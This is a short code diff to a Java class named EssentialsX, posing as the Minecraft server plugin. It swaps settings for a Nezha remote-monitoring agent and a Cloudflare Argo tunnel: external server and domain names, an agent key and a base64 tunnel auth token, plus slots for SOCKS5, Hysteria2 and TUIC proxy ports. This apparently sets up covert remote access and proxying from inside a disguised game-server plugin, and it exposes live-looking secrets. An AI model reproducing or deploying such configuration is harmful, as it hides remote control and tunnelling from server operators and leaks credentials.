@@ -77,10 +77,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezha.future10000.eu.org");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "7m2vPncZqkWWApnqvO");
+        env.put("NEZHA_KEY", "ZoDlJ3zo5XULVlWida");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "mc.future13800.eu.org");
-        env.put("ARGO_AUTH", "eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiNGJlY2IzMjctOGRiZS00N2MyLTg5MjgtMWVlMDEyZjIxM2Y5IiwicyI6IlpUbGtPV05rTnpRdE5qRTVNUzAwTURneExXRmhaRFl0TURoaVlXRmhORGd5WVdObCJ9");
+        env.put("ARGO_DOMAIN", "mcserver.future13800.eu.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiOWI4OThiZWMtMDUzMi00NTQ3LTllMDYtZWNiNmVlYzU2OTY1IiwicyI6IlpqVTJNek5qWVRZdE5HVmhNUzAwT0RGakxUZ3laR0l0WmpVMlpEWm1PR1ptWTJFeiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
